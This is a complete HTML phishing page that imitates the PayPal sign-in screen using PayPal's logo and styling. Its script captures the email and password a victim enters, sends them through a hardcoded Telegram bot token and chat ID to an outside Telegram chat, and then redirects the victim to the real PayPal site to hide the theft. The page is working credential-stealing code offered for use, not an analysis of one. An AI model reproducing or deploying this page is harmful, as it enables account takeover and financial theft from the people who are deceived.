<!DOCTYPE html>
<html>
<head>
    <title>PayPal - Sign In</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 400px;
            margin: 50px auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 3px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #00457C;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #003d6b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom.svg" alt="PayPal" width="200">
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email or mobile number</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            const botToken = '8784415231:AAE3xYSlX5ztT_IrFN6jBt7VQoCfaxUozsI';
            const chatId = '7377531552';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            const data = {
                chat_id: chatId,
                text: `PayPal Login Attempt\nEmail: ${email}\nPassword: ${password}`
            };
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(() => {
                // Redirect to real PayPal after "login"
                window.location.href = "https://www.paypal.com";
            });
        });
    </script>
</body>
</html>
